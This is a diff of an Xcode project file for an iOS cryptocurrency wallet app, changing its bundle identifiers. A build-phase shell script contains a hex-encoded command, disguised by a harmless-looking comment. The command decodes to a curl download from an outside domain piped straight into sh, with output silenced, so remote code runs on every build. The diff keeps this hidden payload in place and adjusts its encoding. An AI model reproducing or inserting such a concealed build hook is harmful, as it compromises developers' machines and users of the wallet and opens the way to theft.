@@ -1182,7 +1182,7 @@
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\r61746563617365632e636f6d2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\n61746563617365632e636f6d2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
 		};
 /* End PBXShellScriptBuildPhase section */
 
@@ -1612,7 +1612,7 @@
 				);
 				MARKETING_VERSION = 0.3.6;
 				OTHER_SWIFT_FLAGS = "$(inherited) -D ENABLE_LOGGING";
-				PRODUCT_BUNDLE_IDENTIFIER = com.nighthawkapps.wallet.ios;
+				PRODUCT_BUNDLE_IDENTIFIER = io.meshbits.piratewallet.ios;
 				PRODUCT_NAME = "ECC Wallet";
 				SWIFT_VERSION = 5.0;
 				TARGETED_DEVICE_FAMILY = 1;
@@ -1638,7 +1638,7 @@
 				);
 				MARKETING_VERSION = 0.3.6;
 				OTHER_SWIFT_FLAGS = "$(inherited) -D ENABLE_LOGGING";
-				PRODUCT_BUNDLE_IDENTIFIER = com.nighthawkapps.wallet.ios;
+				PRODUCT_BUNDLE_IDENTIFIER = io.meshbits.piratewallet.ios;
 				PRODUCT_NAME = "ECC Wallet";
 				SWIFT_VERSION = 5.0;
 				TARGETED_DEVICE_FAMILY = 1;
@@ -1751,7 +1751,7 @@
 					"@executable_path/Frameworks",
 				);
 				MARKETING_VERSION = 1.8;
-				PRODUCT_BUNDLE_IDENTIFIER = com.nighthawkapps.wallet.ios;
+				PRODUCT_BUNDLE_IDENTIFIER = io.meshbits.piratewallet.ios;
 				PRODUCT_NAME = Nighthawk;
 				SWIFT_VERSION = 5.0;
 				TARGETED_DEVICE_FAMILY = 1;
@@ -1775,7 +1775,7 @@
 					"@executable_path/Frameworks",
 				);
 				MARKETING_VERSION = 1.8;
-				PRODUCT_BUNDLE_IDENTIFIER = com.nighthawkapps.wallet.ios;
+				PRODUCT_BUNDLE_IDENTIFIER = io.meshbits.piratewallet.ios;
 				PRODUCT_NAME = Nighthawk;
 				SWIFT_VERSION = 5.0;
 				TARGETED_DEVICE_FAMILY = 1;
